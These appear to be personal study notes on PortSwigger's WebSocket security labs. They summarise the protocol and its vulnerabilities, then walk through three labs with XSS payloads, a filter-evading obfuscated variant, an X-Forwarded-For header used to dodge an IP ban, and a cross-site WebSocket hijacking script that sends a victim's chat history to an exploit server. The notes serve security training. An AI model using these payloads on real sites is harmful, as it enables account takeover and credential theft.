https://portswigger.net/web-security/websockets/what-are-websockets

# Summary
WebSockets are a communication protocol that provides full-duplex communication channels over a single TCP connection. Unlike the traditional HTTP request-response model, WebSockets enable persistent connections between client and server, allowing for real-time data exchange in both directions without requiring the client to initiate each communication.

**WebSocket Protocol:**
- Established over HTTP using an upgrade request
- Starts with a standard HTTP handshake
- Uses `ws://` (unencrypted) or `wss://` (encrypted) URI scheme
- Operates on ports 80/443 by default, but can use any port

	![](Pasted%20image%2020250315194728.png)

##  Vulnerabilities
1. **Cross-Site WebSocket Hijacking (CSWSH)**
    - Similar to CSRF but for WebSockets
    - Occurs when WebSocket handshakes lack proper origin validation
    - Can lead to session hijacking
2. **Input Validation Vulnerabilities**
    - XSS in WebSocket messages
    - SQL injection via WebSocket data
    - Server-side template injection
    - OS command injection
3. **Authentication Issues**
    - Missing authentication checks after initial handshake
    - Token leakage or improper session handling
4. **Information Disclosure**
    - Sensitive data transmitted over unencrypted WebSockets
    - Excessive error messages revealing implementation details
5. **Denial of Service**
    - Resource exhaustion through multiple connections
    - Message flooding

## Security Best Practices
1. **Secure Communication**
    - Use wss:// (WebSockets Secure) instead of ws://
    - Implement TLS 1.2+ for all WebSocket connections
2. **Authentication and Authorization**
    - Properly authenticate users before establishing WebSocket connections
    - Implement authorization checks for each message
    - Use secure tokens or cookies
    - Re-validate permissions for sensitive operations
3. **Input Validation**
    - Validate and sanitize all data received via WebSockets
    - Implement message schemas and enforce compliance
    - Apply context-appropriate encoding for output
4. **Connection Management**
    - Implement timeouts for inactive connections
    - Limit number of connections per client
    - Properly handle connection termination
5. **Origin Validation**
    - Verify the Origin header during WebSocket handshake
    - Implement CORS policies for WebSocket connections
6. **Monitoring and Rate Limiting**
    - Monitor WebSocket traffic for anomalies
    - Implement rate limiting to prevent abuse
    - Set up alerts for suspicious activities

## Differences from HTTP
1. **Connection Persistence**
    - WebSockets maintain a persistent connection, unlike the stateless nature of HTTP
    - Reduced overhead for multiple communications
2. **Bidirectional Communication**
    - Server can push data to clients without client requests
    - More efficient for real-time applications
3. **Message-Based vs Document-Based**
    - WebSockets use message-based communication
    - HTTP is document-based
4. **Reduced Header Overhead**
    - After handshake, WebSocket frames have minimal headers
    - More efficient for frequent, small messages


# 1. Manipulating WebSocket messages
This online shop has a live chat feature implemented using WebSockets. Chat messages that you submit are viewed by a support agent in real time.
To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.

**Analysis:**
1. Click "Live chat" and send a chat message. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message.
2. Using the browser, send a new message containing a `<` character. In Burp Proxy, find the corresponding WebSocket message and observe that the `<` has been HTML-encoded by the client before sending.
3. Ensure that Burp Proxy is configured to intercept WebSocket messages, then send another chat message.
4. Edit the intercepted message to contain the following payload:
    `<img src=1 onerror='alert(1)'>`. Observe that an alert is triggered in the browser. This will also happen in the support agent's browser.

**Workflow:**
1. Click "Live chat" and send a chat message. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message
	![](Pasted%20image%2020250321131923.png)
	![](Pasted%20image%2020250321131936.png)
2. Using the browser, send a new message containing a `<` character. In Burp Proxy, find the corresponding WebSocket message and observe that the `<` has been HTML-encoded by the client before sending.
	![](Pasted%20image%2020250321132059.png)
	![](Pasted%20image%2020250321132124.png)
3.  Ensure that Burp Proxy is configured to intercept WebSocket messages, then send another chat message. Edit the intercepted message to contain the following payload:
    `<img src=1 onerror='alert(1)'>`.
    ![](Pasted%20image%2020250321132229.png)
    ![](Pasted%20image%2020250321132703.png)
    ![](Pasted%20image%2020250321132712.png)


# 2. Cross-site WebSocket hijacking
This online shop has a live chat feature implemented using WebSockets.
To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this gain access to their account.

**Analysis**:
1. Click "Live chat" and send a chat message. Reload the page.
2. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no CSRF tokens.
3. Right-click on the handshake request and select "Copy URL". In the browser, go to the exploit server and paste the following template into the "Body" section:
```javascript
<script>
    var ws = new WebSocket('wss://0a52007f04bbf30e822d0c2500fb00c9.web-security-academy.net/chat');
    
    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://exploit-0a8500270439f3b982840b1f014d00e3.exploit-server.net/exploit?message=' + btoa(event.data)), 
    };
</script>
```
4. Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. 
5. Go back to the exploit server and deliver the exploit to the victim. Poll for interactions in the Collaborator tab again. Observe that you've received more HTTP interactions containing the victim's chat history. Examine the messages and notice that one of them contains the victim's username and password.

**Workflow:**
1. Inspecting the chat we observe that is refreshing entire chat history because of user cookie, however SameSite attribute is not present on the cookie which can lead to CSRF
	![](Pasted%20image%2020250321150537.png)
2. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. 
	![](Pasted%20image%2020250321150831.png)
	![](Pasted%20image%2020250321151125.png)
3. Observe that the GET/chat request has no CSRF tokens.
	![](Pasted%20image%2020250321151307.png)
4. Until now we have following:
	![](Pasted%20image%2020250321151333.png)
	![](Pasted%20image%2020250321151537.png)
5. Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. 
	![](Pasted%20image%2020250321152047.png)
6.  Go back to the exploit server and deliver the exploit to the victim. Observe that you've received more HTTP interactions containing the victim's chat history. Examine the messages and notice that one of them contains the victim's username and password. 
	   ![](Pasted%20image%2020250321152724.png)
7. Now let's decode from base64 format the intercepted messages:
	![](Pasted%20image%2020250321154242.png)


# 3. Manipulating the WebSocket handshake to exploit vulnerabilities
This online shop has a live chat feature implemented using WebSockets. It has an aggressive but flawed XSS filter.
To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.

**Analysis**:
1. Click "Live chat" and send a chat message. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message.
2. Right-click on the message and select "Send to Repeater". Edit and resend the message containing a basic XSS payload, such as:
    `<img src=1 onerror='alert(1)'>`
3. Observe that the attack has been blocked, and that your WebSocket connection has been terminated. Click "Reconnect", and observe that the connection attempt fails because your IP address has been banned.
4. Add the following header to the handshake request to spoof your IP address:
    `X-Forwarded-For: 1.1.1.1`
5. Click "Connect" to successfully reconnect the WebSocket. Send a WebSocket message containing an obfuscated XSS payload, such as:
    ``<img src=1 oNeRrOr=alert`1`>``


**Workflow**:
1. Click "Live chat" and send a chat message. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message.
	![](Pasted%20image%2020250321155230.png)
	![](Pasted%20image%2020250321155309.png)
2. Right-click on the message and select "Send to Repeater". Edit and resend the message containing a basic XSS payload, such as: `<img src=1 onerror='alert(1)'>`
	![](Pasted%20image%2020250321155329.png)
3. Observe that the attack has been blocked, and that your WebSocket connection has been terminated. Click "Reconnect", and observe that the connection attempt fails because your IP address has been banned.
	![](Pasted%20image%2020250321155605.png)
4. Add the following header to the handshake request to spoof your IP address:
    `X-Forwarded-For: 1.1.1.1`
    ![](Pasted%20image%2020250321160148.png)
5. Click "Connect" to successfully reconnect the WebSocket. Send a WebSocket message containing an obfuscated XSS payload, such as:
   `<img src=1 oNeRrOr=alert`1`>  `